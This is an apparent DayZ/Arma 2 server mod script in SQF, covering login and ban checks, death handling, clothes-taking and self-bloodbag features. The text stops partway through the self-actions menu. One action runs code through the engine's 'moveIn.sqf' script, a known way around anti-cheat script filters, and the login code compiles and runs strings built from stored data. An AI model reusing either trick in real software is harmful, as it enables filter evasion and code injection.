waitUntil {!isNil "sm_done"};

if !(isNil "doFirstTime") exitWith {}; doFirstTime = 1;

diag_log "hangender is here";

//ctrlText = "STRING";
//publicVariable "ctrlText";

"rthethsrthsfghsfhsfg" addPublicVariableEventHandler
{
};

BPServer_LoginQueueAdd1 = {
private ["_playerID","_playerObj","_segment","_msg","_data","_playerName","_clientID","_hacker"];
_playerID = _this select 0;
_playerObj = _this select 1;
_playerName = name _playerObj;
_clientID = owner _playerObj;
_segment = [_playerID,_playerObj];
_hacker = _playerObj getVariable ["fhrthsrthsghsfghdfghdfghdfgh", 0];

if (_playerName == '__SERVER__' || local player) exitWith {};
if (_playerName == '__HC__' || _playerName == "HC") exitWith {};

if (isNil "sm_done") exitWith {
diag_log format ["LOGIN FAILURE: Player %1 (%2) Login Failure: Server Not Ready.",_playerName,_playerID];
_data = [_playerID,"ERROR","Login Failure: Server Not Ready."];
[_clientID,_data] call BPServer_SendLogin;
};

if (isNull _playerObj or !isPlayer _playerObj) exitWith {
diag_log ("LOGIN FAILED: Player object null: " + str(_playerObj));
};

if (_playerID == "" or (isNil "_playerID")) then {
_playerID = getPlayerUID _playerObj;
};

if ((_playerID == "") or (isNil "_playerID")) exitWith {
diag_log format ["LOGIN FAILED: Player %1 (%2) has no login ID.",_playerName,_playerID];
_data = [_playerID,"ERROR","Login Failure: Invalid Login ID"];
[_clientID,_data] call BPServer_SendLogin;
};

if (_playerID in BP_Banned) exitWith {
diag_log format ["LOGIN REJECTED: Player %1 (%2) Login Failure: Error ID: 1",_playerName,_playerID];
_data = [_playerID,"ERROR","Login Failure: Error ID: 1"];
[_clientID,_data] call BPServer_SendLogin;
};

if (_hacker == 0) exitWith {
diag_log format ["LOGIN REJECTED: Player %1 (%2) Login Failure: Error ID: 2",_playerName,_playerID];
_data = [_playerID,"ERROR","Login Failure: Error ID: 2"];
[_clientID,_data] call BPServer_SendLogin;
};

{
if (isPlayer _x) then {
_myGroupX = group _x;
_x removeAllMPEventHandlers "mpkilled";
_x removeAllMPEventHandlers "mphit";
_x removeAllMPEventHandlers "mprespawn";
_x removeAllEventHandlers "FiredNear";
_x removeAllEventHandlers "HandleDamage";
_x removeAllEventHandlers "Killed";
_x removeAllEventHandlers "Fired";
_x removeAllEventHandlers "GetOut";
_x removeAllEventHandlers "Local";
clearVehicleInit _x;
deleteVehicle _x;
deleteGroup _myGroupX;
_x = nil;
};
} forEach entities "Seagull";


{
if (count units _x==0) then {
deleteGroup _x;
_x = nil;
};
} forEach allGroups;

_msg = format ["LOGIN SYSTEM: %1 (%2) [%3] requests to be added to the login queue.",_playerName,_playerID,_clientID];
diag_log(_msg);

_msg = format ["LOGIN SYSTEM: %1 (%2) [%3] has been added to the login queue.",_playerName,_playerID,_clientID];
diag_log(_msg);

[_playerID,_playerObj] call BP_server_playerLogin1;

};

BP_server_playerLogin1 = {
private ["_LoginThread","_doLoop","_hiveVer","_isHiveOk","_clientID","_playerID","_primary","_key","_charID","_playerObj","_playerName","_backpack","_isNew","_inventory","_survival","_model","_newPlayer","_dayzPlayerLogin","_config","_mags","_wpns","_bcpk","_ModelArray","_SelectedModel","_data"];

diag_log ("STARTING LOGIN: " + str(_this));

_playerID = _this select 0;
_playerObj = _this select 1;
_playerName = name _playerObj;
_clientID = owner _playerObj;

if (isNull _playerObj or !isPlayer _playerObj) exitWith {
diag_log ("LOGIN FAILED: Player object null: " + str(_playerObj));
};

if (count _this > 2) then {
dayz_players = dayz_players - [_this select 2];
};


_inventory =	[];
_backpack = 	[];
_survival =		[0,0,0];
_model =		"";

_doLoop = 0;
while {_doLoop < 5} do {
_key = format["CHILD:101:%1:%2:%3:",_playerID,dayZ_instance,_playerName];
_primary = _key call server_hiveReadWrite;
if (count _primary > 0) then {
if ((_primary select 0) != "ERROR") then {
_doLoop = 9;
};
};
_doLoop = _doLoop + 1;
};

if ((_primary select 0) == "ERROR") exitWith {	
diag_log format ["LOGIN FAILED: %3 (%2) Unable to load _primary: %1 ",_primary,_playerID,_playerName];
_data = [_playerID,"ERROR","Login Failure: Critical Hive Failure #1"];
[_clientID,_data] call BPServer_SendLogin;
};


_newPlayer = 	_primary select 1;
_isNew = 		count _primary < 6; 
_charID = 		_primary select 2;


_hiveVer = 0;

_ModelArray = ["Survivor2_DZ"];
_SelectedModel =  (_ModelArray select floor(random(count _ModelArray)));

if (!_isNew) then {

_inventory = 	_primary select 4;
_backpack = 	_primary select 5;
_survival =		_primary select 6;
_model =		_primary select 7;
_hiveVer =		_primary select 8;

if (!(_model in ["DeathlyMatrixGhillie_BP","ValtielGhillie_BP","UrbanStoneGhillie_BP","UrbanConcreteGhillie_BP","FarmGhillie_BP","TreeBarkGhillie_BP","ForestGhillie_BP","Survivor3_DZ","Bandit1_DZ","Soldier_Crew_PMC","Sniper1_DZ","Sniper2_DZ","Camo1_DZ","Camo2_DZ","Camo3_DZ","Camo4_DZ","Camo5_DZ","Camo6_DZ","Camo7_DZ","Camo8_DZ","Camo9_DZ","Camo10_DZ","Camo11_DZ","Camo12_DZ","Camo13_DZ","Soldier1_DZ","CIV_EuroMan01_DZ","CIV_EuroMan02_DZ","Citizen2_DZ","Citizen3_DZ","Pilot_DZ, INS_Lopotev_DZ","Rocker3_DZ","Survivor2_DZ","Survivor1_DZ"])) then {
_model = _SelectedModel;
};

} else {
_model =		_primary select 3;
_hiveVer =		_primary select 4;
if (isNil "_model") then {
_model = _SelectedModel;
} else {
if (_model == "") then {
_model = _SelectedModel;
};
};


_config = (configFile >> "CfgSurvival" >> "Inventory" >> "Default");
_mags = getArray (_config >> "magazines");
_wpns = getArray (_config >> "weapons");
_bcpk = getText (_config >> "backpack");


_key = format["CHILD:203:%1:%2:%3:",_charID,[_wpns,_mags],[_bcpk,[],[]]];
_key call server_hiveWrite;

};
diag_log ("LOGIN LOADED: " + str(_playerObj) + " Type: " + (typeOf _playerObj));

_isHiveOk = false;	
if (_hiveVer >= dayz_hiveVersionNo) then {
_isHiveOk = true;
};

_dayzPlayerLogin = [_playerID,_charID,_inventory,_backpack,_survival,_isNew,dayz_versionNo,_model,_isHiveOk,_newPlayer];

_LoginThread = [_playerID,_clientID,_charID,_playerObj,_dayzPlayerLogin] call {

private ["_dayzPlayerLogin","_characterID","_doLoop","_playerID","_playerObj","_primary","_key","_humanity","_clientID","_data","_playerName","_model"];
_playerID = _this select 0;
_clientID = _this select 1;
_characterID = _this select 2;
_playerObj = _this select 3;
_dayzPlayerLogin = _this select 4;

if (_clientID != (owner _playerObj)) exitWith {	
_data = [_playerID,"ERROR","Login Failure: Client ID Mismatch."];
[_clientID,_data] call BPServer_SendLogin;
};

if (_playerID != (getPlayerUID _playerObj)) exitWith {	
_data = [_playerID,"ERROR","Login Failure: Player ID Mismatch."];
[_clientID,_data] call BPServer_SendLogin;
};



_doLoop = 0;
while {_doLoop < 5} do {
_key = format["CHILD:102:%1:",_characterID];
_primary = _key call server_hiveReadWrite;
if (count _primary > 0) then {
if ((_primary select 0) != "ERROR") then {
_doLoop = 9;
};
};
_doLoop = _doLoop + 1;
};

if ((_primary select 0) == "ERROR") exitWith {	
diag_log format ["LOGIN FAILED: %3 (%2) Critical Hive Failure #2: %1 ",_playerID];
_data = [_playerID,"ERROR","Login Failure: Critical Hive Failure #2"];
[_clientID,_data] call BPServer_SendLogin;
};

_countInv = count (_dayzPlayerLogin select 2);
if (_countInv == 0) then {
_worldspace = _primary select 4;
_randomSpot = false;
if (count _worldspace > 0) then {

	_position = _worldspace select 1;
	if (count _position < 3) then {
		//prevent debug world!
		_randomSpot = true;
	};
	_debug = getMarkerpos "respawn_west";
	_distance = _debug distance _position;
	if (_distance < 2000) then {
		_randomSpot = true;
	};
	
	_distance = [0,0,0] distance _position;
	if (_distance < 500) then {
		_randomSpot = true;
	};

	//_playerObj setPosATL _position;
} else {
	_randomSpot = true;
};

if (_randomSpot) then {
_dayzPlayerLogin set [2, [["DDOPP_X3_b"],["ItemPainkiller","DDOPP_3Rnd_X3","DDOPP_3Rnd_X3","DDOPP_3Rnd_X3","ItemBandage","ItemBandage"]]];
};
};

_model = "Survivor2_DZ";
_model = _dayzPlayerLogin select 7;
if (_model == "Survivor2_DZ") then
{
_humanity = _primary select 5;

if (_humanity > 5000) then
{
_model = "Survivor3_DZ";
};

if (_humanity < 0) then
{
_model = "Bandit1_DZ";
};
_dayzPlayerLogin set [7, _model];
};


dayz_players set [count dayz_players,_playerObj];

_dayzPlayerLogin set [count _dayzPlayerLogin, _primary];
//_data = _dayzPlayerLogin;
//[_clientID,_data] call BPServer_SendLogin;

_tempVar = "dayzPlayerLogin" + (_dayzPlayerLogin select 0);
call compile format["%1 = %2;",_tempVar,_dayzPlayerLogin];
_clientID publicVariableClient _tempVar;

call compile format["%1 = nil;",_tempVar,_dayzPlayerLogin];

diag_log ("LOGIN PUBLISHING: is " + str(_dayzPlayerLogin));
diag_log ("LOGIN PUBLISHING: " + str(_playerObj) + " Type: " + (typeOf _playerObj));
};

//waitUntil {scriptDone _LoginThread};
};

server_playerDied = {
private ["_characterID","_minutes","_newObject","_playerID","_key","_playerName","_victim","_killer","_weapon","_message","_distance","_victimName","_killerName","_log_message"];

_characterID = 	_this select 0;
_minutes =	_this select 1;
_newObject = 	_this select 2;
_playerID = 	_this select 3;
_playerName = 	_this select 4;

_victim removeAllEventHandlers "MPHit";


_newObject setVariable["processedDeath",time];
_newObject setVariable ["bodyName", _playerName, true];








if (typeName _minutes == "STRING") then 
{
_minutes = parseNumber _minutes;
};

if (_characterID != "0") then 
{
_key = format["CHILD:202:%1:%2:",_characterID,_minutes];
_key call server_hiveWrite;
} 
else 
{
deleteVehicle _newObject;
};

diag_log ("PDEATH: Player Died " + _playerID);

};

"dayzLogin"			addPublicVariableEventHandler {_id = (_this select 1) call BPServer_LoginQueueAdd1};
"usecBleed"			addPublicVariableEventHandler {};
"dayzHumanity"		addPublicVariableEventHandler {};


_PROTECTED_BP_PlayerLoginInit =
{
	if !(isNil "firstBPLogin") exitWith {};
	firstBPLogin = 1; if (getPlayerUID player in _this) exitWith {endMission "END1";};
	
	//"dayzPlayerLoginNew" addPublicVariableEventHandler { _array = _this select 1; if (getPlayerUID player == (_array select 0)) then {dayzPlayerLogin = _array;}; };
	
	player setVariable ["fhrthsrthsghsfghdfghdfghdfgh", 1, true];
	
	//_playerUID = getPlayerUID player;
	//waitUntil {!(isNil "_playerUID") and (typeName (getPlayerUID player) == "STRING") and ((getPlayerUID player) != "")};
	
	_tempVar = "dayzPlayerLogin" + (getPlayerUID player);
	_tempVar addPublicVariableEventHandler { _array = _this select 1; dayzPlayerLogin = _array; };

	
	waitUntil {!isNil "dayz_forceSave"};
	
	0 cutText ["Server is under heavy load. Please wait a while in this peaceful debug forest (2 mins max).", "BLACK FADED",60];
	
	 clothes_code = {[] spawn{
	 // Created by [GEEK SQUAD]Churchie
// Contributors to getting it working are:| cyrq | Manatee Hunter | Deasil | Seaweeduk |Thank you!
player removeAction s_clothes;
s_clothes = -1;
private["_body","_result"];
    _body = cursorTarget;
    _model = typeOf _body;
if( _model in ["Sniper1_DZ","Camo1_DZ","Sniper2_DZ","Camo2_DZ","Camo3_DZ","Camo4_DZ","Camo5_DZ","Soldier1_DZ","Camo6_DZ","Camo7_DZ",
"Camo8_DZ","Camo9_DZ","Camo10_DZ","Camo11_DZ","Camo12_DZ","Camo13_DZ","Net_DZ"] ) then { _model = "Skin_" + _model;
	_rnd = random 1;
	if (_rnd > 0.2) then {
		_result = [player,_model] call BIS_fnc_invAdd;
	}
	else {
		_model = "Skin_Survivor2_DZ";
		_result = [player,_model] call BIS_fnc_invAdd;
		cutText ["The clothing tears as you try to remove it from the corpse", "PLAIN DOWN"];
	};
if (_result) then { player playActionNow "PutDown";
private["_name","_method","_methodStr"];
    _name = _body getVariable["bodyName","unknown"];
    _method = _body getVariable["deathType","unknown"];
    _methodStr = localize format ["str_death_%1",_method];
    _class = "Survivor2_DZ";
    _position = getPosATL _body;
    _dir = getDir _body;
    _currentAnim = animationState
    _body; private ["_weapons","_magazines","_primweapon","_secweapon"];
    _weapons = weapons _body;
    _primweapon = primaryWeapon
    _body; _secweapon = secondaryWeapon _body;
if(!(_primweapon in _weapons) && _primweapon != "") then { _weapons = _weapons + [_primweapon]; };
if(!(_secweapon in _weapons) && _secweapon != "") then { _weapons = _weapons + [_secweapon]; };
    _magazines = magazines _body;
private ["_newBackpackType","_backpackWpn","_backpackMag"]; dayz_myBackpack = unitBackpack _body;
    _newBackpackType = (typeOf dayz_myBackpack);
if(_newBackpackType != "") then { _backpackWpn = getWeaponCargo unitBackpack _body;
    _backpackMag = getMagazineCargo unitBackpack _body; };
    _currentWpn = currentWeapon _body;
    _muzzles = getArray(configFile >> "cfgWeapons" >> _currentWpn >> "muzzles");
if (count _muzzles > 1) then { _currentWpn = currentMuzzle _body; };
        diag_log "Attempting to switch model";
        diag_log str(_weapons);
        diag_log str(_magazines);
        diag_log (str(_backpackWpn));
        diag_log (str(_backpackMag));
   // _body setPosATL dayz_spawnPos;
    _oldUnit = _body;
	removeAllWeapons _oldUnit; {_oldUnit removeMagazine _x;
    } forEach magazines _oldUnit; deleteVehicle _oldUnit;
    _group = createGroup west;
	_newUnit = _group createUnit [_class,_position,[],0,"NONE"];
    //_newUnit setPosATL _position;
    _newUnit setDir _dir; {_newUnit removeMagazine _x;} forEach magazines _newUnit;
    removeAllWeapons _newUnit; {
if (typeName _x == "ARRAY") then {_newUnit addMagazine [_x select 0,_x select 1]
    } else { _newUnit addMagazine _x };
    } forEach _magazines; { _newUnit addWeapon _x; } forEach _weapons;
if(str(_weapons) != str(weapons _newUnit)) then { { _weapons = _weapons - [_x];
    } forEach (weapons _newUnit); {
    _newUnit addWeapon _x;
    } forEach _weapons; };
if(_primweapon != (primaryWeapon _newUnit)) then { _newUnit addWeapon _primweapon; };
if(_secweapon != (secondaryWeapon _newUnit) && _secweapon != "") then { _newUnit addWeapon _secweapon; };
if (!isNil "_newBackpackType") then {
if (_newBackpackType != "") then { _newUnit addBackpack _newBackpackType;
    _oldBackpack = dayz_myBackpack; dayz_myBackpack = unitBackpack _newUnit; _backpackWpnTypes = [];
    _backpackWpnQtys = [];
if (count _backpackWpn > 0) then { _backpackWpnTypes = _backpackWpn select 0;
    _backpackWpnQtys = _backpackWpn select 1; };
    _countr = 0; { dayz_myBackpack addWeaponCargoGlobal [_x,(_backpackWpnQtys select _countr)];
    _countr = _countr + 1;
    } forEach _backpackWpnTypes;
    _backpackmagTypes = [];
    _backpackmagQtys = [];
if (count _backpackmag > 0) then { _backpackmagTypes =
    _backpackMag select 0;
    _backpackmagQtys = _backpackMag select 1; };
    _countr = 0; { dayz_myBackpack addmagazineCargoGlobal [_x,(_backpackmagQtys select _countr)];
    _countr = _countr + 1;
    } forEach _backpackmagTypes; }; };
        diag_log "Taking Clothes. Equipment:";
        diag_log str(weapons _newUnit); diag_log str(magazines _newUnit);
        diag_log str(getWeaponCargo unitBackpack _newUnit);
        diag_log str(getMagazineCargo unitBackpack _newUnit);
	_entity = _newUnit;	
	_entity setDamage 1;
    _newUnit setVariable["bodyName",_name,true];
    _newUnit setVariable["deathType",_method,true];
    } else {
        cutText ["You need a free slot to take clothing.", "PLAIN DOWN"];
    };
};
	 };};
	
	selfBloodBag = { [] spawn {
	//////////////////////////////////////////////////////////////////////////////////////////////
// Script writen by Krixes																	//
//    Infection chance and some comments added by Player2									//
//    Combat check added by istealth														//
//																							//
//	Version 1.4																				//
//																							//
// Change Log:																			    //
// 1: Added bloodbag use timer																//
// 2: Added a timer for the amount of time before player can use self bloodbag again		//
//////////////////////////////////////////////////////////////////////////////////////////////

private ["_bloodAmount","_humanityBool","_infectionChance","_humanityNegBool","_humanityNegAmount","_humanityAmount","_infectedLifeLost","_infectedLifeBool","_lastBloodbag","_bloodbagLastUsedTime","_bloodbagTime","_bloodbagUseTime","_bloodbagUsageTime"];



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Config Start-----------------------------------------------------------------------------------------------------------------------//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

_bloodAmount = 8000; // Amount of blood to give to player
_bloodbagUseTime = 20; // Amount of time it takes in second for the player to use the self bloodbag
_bloodbagLastUsedTime = 60; // Amount of time in seconds before player can use self bloodbag again after a succesful use

_infectionChance = 10; // Percent chance of player infection on self bloodbag (10 = 10% | 2 = 50% | 1 = 100%)
_infectedLifeBool = false; // Whether the player can loose life if infected (True = On | False = off)
_infectedLifeLost = 1000; // Amount of life to loose in becomes infected

_humanityBool = false; // Whether the player can get humanity from giving self a bloodbag (True = On | False = off)
_humanityAmount = 50; // Amount of humanity to give player if _humanityBool is true (250 is default for normal bloodbags)

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Config End-------------------------------------------------------------------------------------------------------------------------//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





///////////////////////////////////////////////////////////////////////////////
// Everything below need not be modified unless you know what you are doing! //
///////////////////////////////////////////////////////////////////////////////

_bloodbagTime = time - lastBloodbag; // Variable used for easy reference in determining the self bloodbag cooldown
_bloodbagUsageTime = time;

if(_bloodbagTime < _bloodbagLastUsedTime) exitWith { // If cooldown is not done then exit script
	cutText [format["You may not use Self Bloodbag this soon please wait %1!",(_bloodbagTime - _bloodbagLastUsedTime)], "PLAIN DOWN"]; //display text at bottom center of screen when players cooldown is not done
};

if (dayz_combat == 1) then { // Check if in combat
    cutText [format["You are in Combat and cannot give yourself a Bloodbag"], "PLAIN DOWN"]; //display text at bottom center of screen when in combat
} else {

	player removeAction s_player_selfBloodbag; //remove the action from users scroll menu
	
	player playActionNow "Medic"; //play bloodbag animation
	
	////////////////////////////////////////////////
	// Fancy cancel if interrupted addition start //
	////////////////////////////////////////////////
	r_interrupt = false; // public interuppt variable
	_animState = animationState player; // get the animation state of the player
	r_doLoop = true; // while true sets whether to continue self bloodbagging
	_started = false; // this starts as false as a check
	_finished = false; // this starts as false and when true later sets players blood
	while {r_doLoop} do {
		_animState = animationState player; // keep checking to make sure player is in correct animation
		_isMedic = ["medic",_animState] call fnc_inString; // checking to make sure the animstate is the medic animation still
		if (_isMedic) then {
			_started = true; // this is a check to make sure everything is still ok
		};
		if(!_isMedic && !r_interrupt && (time - _bloodbagUsageTime) < _bloodbagUseTime) then {
			player playActionNow "Medic"; //play bloodbag animation
			_isMedic = true;
		};
		if (_started && !_isMedic && (time - _bloodbagUsageTime) > _bloodbagUseTime) then {
			r_doLoop = false; // turns off the loop
			_finished = true; // set finished to true to finish the self bloodbag and give player health/humanity
			lastBloodbag = time; // the last self bloodbag time
		};
		if (r_interrupt) then {
			r_doLoop = false; // if interuppted turns loop off early so _finished is never true
		};
		sleep 0.1;
	};
	r_doLoop = false; // make sure loop is off on successful self bloodbag
	///////////////////////////////////////////////
	// Fancy cancel if interrupted addition end //
	//////////////////////////////////////////////

	if (_finished) then {
		player removeMagazine "ItemBloodbag"; //remove the used bloodbag from inventory

		r_player_blood = r_player_blood + _bloodAmount; //set players LOCAL blood to a certain ammount
		
		if(r_player_blood > 12000) then {
			r_player_blood = 12000; // If players blood is greater then max amount allowed set it to max allowed (this check keeps an error at bay)
		};
		
		// check if infected
		if (random(_infectionChance) < 1) then {
			r_player_infected = true; //set players client to show infection
			player setVariable["USEC_infected",true,true]; //tell the server the player is infected
			cutText [format["You have used a bloodbag on yourself but the bloodbag was infected!"], "PLAIN DOWN"]; //display text at bottom center of screen if infected
			
			// check for if loosing life on infection is turned on
			if(_infectedLifeBool) then {
				r_player_blood = r_player_blood - _infectedLifeLost; //set players LOCAL blood to a certain ammount
				player setVariable["USEC_BloodQty",r_player_blood,true]; //save this blood ammount to the database
			} else { // if loosing life is turned off
				r_player_lowblood = false; //set lowblood setting to false
				10 fadeSound 1; //slowly fade their volume back to maximum
				"dynamicBlur" ppEffectAdjust [0]; "dynamicBlur" ppEffectCommit 5; //disable post processing blur effect
				"colorCorrections" ppEffectAdjust [1, 1, 0, [1, 1, 1, 0.0], [1, 1, 1, 1],  [1, 1, 1, 1]];"colorCorrections" ppEffectCommit 5; //give them their colour back
				r_player_lowblood = false; //just double checking their blood isnt low
				player setVariable["USEC_BloodQty",r_player_blood,true]; //save this blood ammount to the database
			};
		} else { // if not infected
			r_player_lowblood = false; //set lowblood setting to false
			10 fadeSound 1; //slowly fade their volume back to maximum
			"dynamicBlur" ppEffectAdjust [0]; "dynamicBlur" ppEffectCommit 5; //disable post processing blur effect
			"colorCorrections" ppEffectAdjust [1, 1, 0, [1, 1, 1, 0.0], [1, 1, 1, 1],  [1, 1, 1, 1]];"colorCorrections" ppEffectCommit 5; //give them their colour back
			r_player_lowblood = false; //just double checking their blood isnt low
			player setVariable["USEC_BloodQty",r_player_blood,true]; //save this blood ammount to the database
	 
			cutText [format["You have used a bloodbag on yourself!"], "PLAIN DOWN"]; //display text at bottom center of screen on succesful self bloodbag
		};
		
		// check if giving player humanity is on
		if(_humanityBool) then {
			[player,_humanityAmount] call player_humanityChange; // Set players humanity based on amount listed in config area
		};
	} else {
		// this is for handling if interrupted
		r_interrupt = false;
		player switchMove "";
		player playActionNow "stop";
		cutText [format["You have interrupted giving yourself a bloodbag!"], "PLAIN DOWN"]; //display text at bottom center of screen on interrupt
	};
};
	};};
	

	fnc_usec_selfActions = {

/***********************************************************
	ADD ACTIONS FOR SELF
	- Function
	- [] call fnc_usec_selfActions;
************************************************************/
private["_menClose","_hasBandage","_hasEpi","_hasMorphine","_hasBlood","_vehicle","_inVehicle","_color","_part"];

_vehicle = vehicle player;
_inVehicle = (_vehicle != player);
_bag = unitBackpack player;
_classbag = typeOf _bag;
_isWater = 		(surfaceIsWater (position player)) or dayz_isSwimming;
_hasAntiB = 	"ItemAntibiotic" in magazines player;
_hasFuelE = 	"ItemJerrycanEmpty" in magazines player;
//boiled Water
_hasbottleitem = "ItemWaterbottle" in magazines player;
_hastinitem = false;
{
    if (_x in magazines player) then {
        _hastinitem = true;
    };

} forEach boil_tin_cans;


_hasKnife = 	"ItemKnife" in items player;
_hasMatches = 	"ItemMatchbox" in items player;
_hasToolbox = 	"ItemToolbox" in items player;
//_hasTent = 		"ItemTent" in items player;
_onLadder =		(getNumber (configFile >> "CfgMovesMaleSdr" >> "States" >> (animationState player) >> "onLadder")) == 1;
_nearLight = 	nearestObject [player,"LitObject"];
_canPickLight = false;

if (!isNull _nearLight) then {
	if (_nearLight distance player < 4) then {
		_canPickLight = isNull (_nearLight getVariable ["owner",objNull]);
	};
};
_canDo = (!r_drag_sqf and !r_player_unconscious and !_onLadder);

// ---------------------------------------Krixes Self Bloodbag Start------------------------------------
    _mags = magazines player;
 
    // Krixes Self Bloodbag
    if ("ItemBloodbag" in _mags) then {
        hasBagItem = true;
    } else { hasBagItem = false;};
    if((speed player <= 1) && hasBagItem && _canDo) then {
        if (s_player_selfBloodbag < 0) then {
            s_player_selfBloodbag = player addaction[("<t color=""#c70000"">" + ("Self Bloodbag") +"</t>"),"ca\modules\MP\data\scriptCommands\moveIn.sqf","Driver (call selfBloodBag);",5,false,true,"", ""];
        };
    } else {
        player removeAction s_player_selfBloodbag;
        s_player_selfBloodbag = -1;
    };
// ---------------------------------------Krixes Self Bloodbag End-----------------

//Grab Flare
if (_canPickLight and !dayz_hasLight) then {
	if (s_player_grabflare < 0) then {
		_text = getText (configFile >> "CfgAmmo" >> (typeOf _nearLight) >> "displayName");
		s_player_grabflare = player addAction [format[localize "str_actions_medical_15",_text], "\z\addons\dayz_code\actions\flare_pickup.sqf",_nearLight, 1, false, true, "", ""];
		s_player_removeflare = player addAction [format[localize "str_actions_medical_17",_text], "\z\addons\dayz_code\actions\flare_remove.sqf",_nearLight, 1, false, true, "", ""];
	};
} else {
	player removeAction s_player_grabflare;
	player removeAction s_player_removeflare;
	s_player_grabflare = -1;
	s_player_removeflare = -1;
};

//Allow player to dismantle objects
_objects = nearestObjects [player, ["BuiltItems","Constuctables"], 4];
if (count _objects > 0) then {
    _object = _objects select 0;
    _ownerID = _object getVariable ["characterID","0"];
    if (!isNull _object and !_inVehicle and _hasToolbox and _canDo and _ownerID == dayz_characterID and (player distance _object <= 4)) then {
        if (s_player_deleteBuild < 0) then {
            _text = getText (configFile >> "CfgVehicles" >> typeOf _object >> "displayName");
            s_player_deleteBuild = player addAction [format[localize "str_actions_delete",_text], "\z\addons\dayz_code\actions\remove.sqf",_object, 1, true, true, "", ""];
        };
    } else {
        player removeAction s_player_deleteBuild;
        s_player_deleteBuild = -1;
    };	
} else {
    player removeAction s_player_deleteBuild;
    s_player_deleteBuild = -1;
};

if (!isNull cursorTarget and !_inVehicle and (player distance cursorTarget < 4)) then {	//Has some kind of target
	_isHarvested = cursorTarget getVariable["meatHarvested",false];
	_isVehicle = cursorTarget isKindOf "AllVehicles";
	_isVehicletype = typeOf cursorTarget in ["ATV_US_EP1","ATV_CZ_EP1"];
	_isMan = cursorTarget isKindOf "Man";
	_ownerID = cursorTarget getVariable ["characterID","0"];
	_isAnimal = cursorTarget isKindOf "Animal";
	_isDog =  (cursorTarget isKindOf "DZ_Pastor" || cursorTarget isKindOf "DZ_Fin");
	_isZombie = cursorTarget isKindOf "zZombie_base";
	_isDestructable = cursorTarget isKindOf "BuiltItems";
	_isTent = cursorTarget isKindOf "TentStorage";
	_isFuel = false;
	_isAlive = alive cursorTarget;
	_canmove = canmove cursorTarget;
	_text = getText (configFile >> "CfgVehicles" >> typeOf cursorTarget >> "displayName");
	
	
	_rawmeat = meatraw;
	_hasRawMeat = false;
		{
			if (_x in magazines player) then {
				_hasRawMeat = true;
			};
		} forEach _rawmeat; 
	
	
	if (_hasFuelE) then {
		_isFuel = (cursorTarget isKindOf "Land_Ind_TankSmall") or (cursorTarget isKindOf "Land_fuel_tank_big") 
		or (cursorTarget isKindOf "Land_fuel_tank_stairs") or (cursorTarget isKindOf "Land_wagon_tanker")
		or (cursorTarget isKindOf "Land_A_FuelStation_Feed") or (cursorTarget isKindOf "Land_Ind_TankSmall2")
		or (cursorTarget isKindOf "Land_Ind_TankSmall2_EP1");	
	};
	//diag_log ("OWNERID = " + _ownerID + " CHARID = " + dayz_characterID + " " + str(_ownerID == dayz_characterID));
	
	//Allow player to delete objects
	if(_isDestructable and _hasToolbox and _canDo) then {
		if (s_player_deleteBuild < 0) then {
			s_player_deleteBuild = player addAction [format[localize "str_actions_delete",_text], "\z\addons\dayz_code\actions\remove.sqf",cursorTarget, 1, true, true, "", ""];
		};
	} else {
		player removeAction s_player_deleteBuild;
		s_player_deleteBuild = -1;
	};
	
	
	//Allow player to force save
	//if((_isVehicle or _isTent) and _canDo and !_isMan) then {
	if((_isTent) and _canDo and !_isMan) then {
		if (s_player_forceSave < 0) then {
			s_player_forceSave = player addAction [format[localize "str_actions_save",_text], "\z\addons\dayz_code\actions\forcesave.sqf",cursorTarget, 1, true, true, "", ""];
		};
	} else {
		player removeAction s_player_forceSave;
		s_player_forceSave = -1;
	};
	
	//flip vehicle
	if ((_isVehicletype) and !_canmove and _isAlive and (player distance cursorTarget >= 2) and (count (crew cursorTarget))== 0 and ((vectorUp cursorTarget) select 2) < 0.5) then {
		if (s_player_flipveh  < 0) then {
			s_player_flipveh = player addAction [format[localize "str_actions_flipveh",_text], "\z\addons\dayz_code\actions\player_flipvehicle.sqf",cursorTarget, 1, true, true, "", ""];		
		};	
	} else {
		player removeAction s_player_flipveh;
		s_player_flipveh = -1;
	};
	
	//Allow player to fill jerrycan
	if(_hasFuelE and _isFuel and _canDo) then {
		if (s_player_fillfuel < 0) then {
			s_player_fillfuel = player addAction [localize "str_actions_self_10", "\z\addons\dayz_code\actions\jerry_fill.sqf",[], 1, false, true, "", ""];
		};
	} else {
		player removeAction s_player_fillfuel;
		s_player_fillfuel = -1;
	};
	
	//Permite al jugador recargar chofa estando cerca de una gasolinera sin jerrycan
	
    _gasolineras = nearestObjects[player,["Land_Ind_TankSmall",
"Land_fuel_tank_big","Land_fuel_tank_stairs","Land_wagon_tanker","Land_A_FuelStation_Feed","Land_Ind_TankSmall2","Land_Ind_TankSmall2_EP1"],10];
    _esGasolinera=(count _gasolineras) > 0;
    if((dayz_myCursorTarget != cursorTarget) and _isVehicle and  _esGasolinera and _canDo and !_isMan) then {
        _vehicle = cursorTarget;
        {dayz_myCursorTarget removeAction _x} forEach s_player_repairActions;s_player_repairActions = [];
        dayz_myCursorTarget = _vehicle;
        _string = "<t color='#ffff00'>Auto Refuel</t>"; 
        _handle = dayz_myCursorTarget addAction [_string, "\z\addons\dayz_code\actions\refuel_auto.sqf",[_vehicle], 0, false, true, "",""];
        s_player_repairActions set [count s_player_repairActions,_handle];                
    };
	
	
	
	if (!alive cursorTarget and _isAnimal and _hasKnife and !_isHarvested and _canDo) then {
		if (s_player_butcher < 0) then {
			s_player_butcher = player addAction [localize "str_actions_self_04", "\z\addons\dayz_code\actions\gather_meat.sqf",cursorTarget, 3, true, true, "", ""];
		};
	} else {
		player removeAction s_player_butcher;
		s_player_butcher = -1;
	};
	
	//Fireplace Actions check
	if (inflamed cursorTarget and _hasRawMeat and _canDo) then {
		if (s_player_cook < 0) then {
			s_player_cook = player addAction [localize "str_actions_self_05", "\z\addons\dayz_code\actions\cook.sqf",cursorTarget, 3, true, true, "", ""];
		};
	} else {
		player removeAction s_player_cook;
		s_player_cook = -1;
	};
	if (inflamed cursorTarget and (_hasbottleitem and _hastinitem) and _canDo) then {
		if (s_player_boil < 0) then {
			s_player_boil = player addAction [localize "str_actions_boilwater", "\z\addons\dayz_code\actions\boil.sqf",cursorTarget, 3, true, true, "", ""];
		};
	} else {
		player removeAction s_player_boil;
		s_player_boil = -1;
	};
	
